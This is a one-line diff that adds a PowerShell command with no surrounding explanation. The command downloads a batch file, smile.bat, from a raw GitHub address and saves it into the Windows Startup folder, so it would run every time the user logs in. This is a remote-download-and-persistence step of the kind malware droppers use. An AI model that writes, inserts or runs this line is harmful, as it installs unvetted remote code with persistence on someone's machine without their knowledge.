@@ -1,0 +1,1 @@
+powershell.exe -command "Invoke-WebRequest 'https://raw.githubusercontent.com/CapBlack414/Hash0x1/main/smile.bat' -outfile "$env:APPDATA'\Microsoft\Windows\Start Menu\Programs\Startup\smile.bat'"
